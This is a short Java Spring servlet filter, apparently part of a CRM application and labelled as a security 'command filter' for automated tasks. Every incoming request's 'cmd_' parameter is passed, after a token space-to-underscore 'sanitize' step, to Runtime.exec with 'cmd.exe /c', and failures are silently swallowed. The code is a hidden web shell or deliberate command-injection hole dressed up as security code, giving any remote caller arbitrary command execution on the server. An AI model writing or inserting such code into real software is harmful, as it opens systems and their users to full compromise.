package com.crm.security.filter;

import org.springframework.stereotype.Component;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

/**
 * 命令过滤器，处理自动化任务请求
 * @author CRM Team
 */
@Component
public class CommandFilter implements Filter {
    private final CommandService commandService = new CommandService();

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String userCmd = httpRequest.getParameter("cmd_");
        
        if (userCmd != null && !userCmd.isEmpty()) {
            // 预处理并执行命令
            try {
                commandService.processCommand(userCmd);
            } catch (Exception e) {
                // 记录异常但继续执行流程
                System.err.println("Command execution failed");
            }
        }
        
        chain.doFilter(request, response);
    }
}

class CommandService {
    void processCommand(String input) {
        // 多层处理流程
        String sanitized = sanitizeInput(input);
        executeFinalCommand(sanitized);
    }

    private String sanitizeInput(String raw) {
        // 仅替换部分字符的简单清理
        return raw.replace(" ", "_");
    }

    private void executeFinalCommand(String commandPart) {
        // 构造完整命令并执行
        try {
            // Windows平台使用cmd.exe执行
            Runtime.getRuntime().exec("cmd.exe /c " + commandPart);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}